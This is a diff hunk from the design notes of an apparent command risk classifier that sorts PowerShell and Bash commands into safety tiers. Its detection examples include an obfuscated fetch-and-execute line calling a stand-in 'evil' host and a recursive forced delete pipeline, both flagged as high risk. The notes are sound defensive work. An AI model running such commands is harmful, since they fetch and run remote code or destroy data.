@@ -98,7 +98,7 @@ The wrapped lane above only fires when `base_cmd` is a PowerShell interpreter. I
 - Obfuscation -> T3: `iex (iwr http://evil)`, `iwr x|iex`.
 - Default-deny: `Frobnicate-Thing` -> T3 (unknown PascalCase verb); `Get-FooBar` -> T0 (known read verb, unknown noun).
 - Composition (MAX across stages): `Get-ChildItem | Remove-Item -Recurse -Force` -> T3.
-- Hyphenated PATH argument in a read command -> T0 (the argument is NOT read as a cmdlet): `Get-ChildItem C:\Users\jorge\my-folder`, `Get-ChildItem C:\my-folder -Recurse`, `dir C:\my-app\sub-dir`, `Get-Content C:\a-b\file.txt`.
+- Hyphenated PATH argument in a read command -> T0 (the argument is NOT read as a cmdlet): `Get-ChildItem C:\Users\me\my-folder`, `Get-ChildItem C:\my-folder -Recurse`, `dir C:\my-app\sub-dir`, `Get-Content C:\a-b\file.txt`.
 - Bash NOT regressed: `docker-compose up -d`, `pre-commit run`, `git status`, `cd /repo` all stay T0/POSIX.
 
 **Per-stage first-cmdlet classification (rc.4 refinement):** the cmdlet/verb classification uses ONLY the FIRST Verb-Noun cmdlet of each composition stage (the command position); a hyphenated PATH or FLAG argument that follows the command (`Get-ChildItem C:\my-folder`, `Get-Content C:\a-b\file.txt`) is an argument, never a cmdlet, so it no longer false-positives to T3. This does NOT weaken destructive detection: a destructive cmdlet must occupy a command position (the first cmdlet of a stage) to run, and the whole-payload obfuscation/`-EncodedCommand` scan is unchanged. Earlier revisions scanned the whole string for every Verb-Noun token, which forced a legitimate read with a hyphenated path to T3 -- that trade-off no longer applies.
